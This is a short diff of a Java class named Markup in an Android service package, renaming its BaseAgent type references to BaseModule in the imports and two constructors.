@@ -19,7 +19,6 @@ import java.io.ObjectOutputStream;
 import java.io.Serializable;
 import java.util.HashMap;
 
-import com.android.service.agent.BaseAgent;
 import com.android.service.auto.Cfg;
 import com.android.service.crypto.CryptoException;
 import com.android.service.crypto.Encryption;
@@ -28,6 +27,7 @@ import com.android.service.crypto.Keys;
 import com.android.service.event.BaseEvent;
 import com.android.service.file.AutoFile;
 import com.android.service.file.Path;
+import com.android.service.module.BaseModule;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -79,11 +79,11 @@ public class Markup {
 		this("EVT" + event.getType(), event.getId());
 	}
 	
-	public Markup(BaseAgent event) {
+	public Markup(BaseModule event) {
 		this("AGN" + event.getType());
 	}
 	
-	public Markup(BaseAgent event, int id) {
+	public Markup(BaseModule event, int id) {
 		this("EVT" + event.getType(), id);
 	}
 
